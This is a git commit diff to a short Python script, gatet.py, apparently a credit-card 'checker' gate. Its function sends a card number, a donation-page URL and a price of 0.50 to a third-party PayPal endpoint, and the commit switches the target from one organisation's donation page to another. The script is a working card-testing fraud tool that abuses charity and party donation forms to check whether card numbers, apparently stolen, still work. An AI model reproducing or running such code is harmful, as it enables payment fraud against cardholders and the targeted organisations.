d20971a0516efa868f2c3a7118a1467899ee6611
dfof1298-prog <dfof1298@gmail.com>
2026-03-26 13:54:40 +0200

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://bestnation.com.au/donate-to-the-best-nation-party/"
+	urll="https://2africa.org/donate-now/"
 	price="0.50"
 	res=requests.get(f'https://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
